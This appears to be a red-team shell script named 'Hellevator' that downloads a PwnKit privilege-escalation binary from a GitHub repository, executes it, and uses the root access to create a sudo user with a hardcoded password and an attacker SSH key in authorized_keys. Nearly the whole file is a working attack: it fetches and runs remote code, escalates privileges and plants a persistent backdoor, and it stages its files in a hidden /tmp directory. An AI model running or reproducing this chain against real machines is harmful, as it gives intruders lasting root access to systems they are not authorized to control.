echo "Running Hellevator!"

SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHEVlp/30J0wOuK53YrqMTQ7SduqUw3Mj6R1vfFx76zm josh@parrot"
ADD_USER="useradd -m josh -g sudo -s /bin/bash; echo 'josh:password' | chpasswd; mkdir -p /home/josh/.ssh && touch /home/josh/.ssh/authorized_keys; echo '$SSH_KEY' > /home/josh/.ssh/authorized_keys; cat /home/josh/.ssh/authorized_keys"

echo "Exploiting PwnKit..."
mkdir -p /tmp/.lolzpwnd/$USER
cd /tmp/.lolzpwnd/$USER
wget -O pwnkit_x64 https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/exploits/pwnkit_x64
chmod +x pwnkit_x64
echo $ADD_USER | ./pwnkit_x64
